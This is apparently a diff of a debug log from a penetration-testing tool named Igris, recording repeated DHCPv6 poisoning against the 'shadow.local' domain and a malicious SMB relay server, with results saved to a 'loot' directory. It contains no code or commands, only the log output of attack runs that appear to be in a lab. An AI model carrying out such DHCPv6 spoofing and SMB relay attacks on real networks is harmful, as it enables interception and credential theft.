+2021-12-29 12:08:57.476 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:08:58.234 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:08:58.235 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:08:59.251 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:08:59.252 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:00.259 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:09:00.260 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:02.259 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:09:02.259 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:02.260 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:09:06.257 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:09:06.257 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:14.266 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:09:14.267 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:14.270 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:09:30.273 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:09:30.273 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:09:30.273 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:09:43.636 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 12:09:52.435 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 12:09:52.435 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 12:09:52.438 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 12:09:52.443 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 12:09:52.444 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 12:09:52.447 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 12:09:52.448 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 12:09:52.448 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 12:10:08.899 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:08.900 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:08.906 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:10:09.881 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:09.881 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:10.674 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:10.675 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:11.695 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:11.695 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:12.700 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:12.701 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:12.705 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:10:14.700 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:14.701 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:18.713 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:18.714 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:26.726 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:26.727 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:26.729 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:10:42.742 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:10:42.742 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:10:42.745 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:10:46.676 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 12:11:21.437 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 12:11:21.440 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 12:11:21.450 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 12:11:21.466 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-29 12:11:21.468 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 12:11:21.482 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 12:11:21.484 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 12:11:21.494 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 12:11:41.295 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:41.295 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:41.297 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:11:42.311 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:42.312 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:42.320 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:11:42.772 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:42.773 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:43.785 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:43.785 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:45.799 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:45.800 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:46.797 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:46.797 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:48.803 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:48.803 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:52.813 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:11:52.813 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:11:52.814 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:11:54.224 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 12:18:43.277 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 12:18:43.280 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 12:18:43.288 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 12:18:43.307 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-29 12:18:43.309 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 12:18:43.328 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 12:18:43.330 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 12:18:43.333 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 12:19:00.058 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:00.059 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:00.060 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:19:01.070 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:01.071 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:01.801 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:01.801 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:02.830 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:02.830 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:03.833 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:03.834 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:03.834 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:19:05.829 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:05.829 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:09.845 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:09.845 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:17.844 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:19:17.844 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:19:17.845 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:19:24.548 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 14:14:42.976 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 14:14:42.977 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 14:14:42.982 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 14:14:42.989 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-29 14:14:42.990 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 14:14:42.996 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 14:14:43.003 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 14:14:43.005 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 14:15:12.186 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:12.187 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:12.188 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:15:13.188 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:13.189 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:13.189 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 14:15:14.857 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:14.858 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:15.885 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:15.886 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:16.896 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:16.897 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:18.888 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:18.889 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:22.895 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 14:15:22.896 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 14:15:27.960 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 14:29:19.543 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 14:29:19.544 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 14:29:19.548 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 14:29:19.555 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-29 14:29:19.557 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 14:29:19.564 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 14:29:19.565 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 14:29:19.566 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 14:30:03.560 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
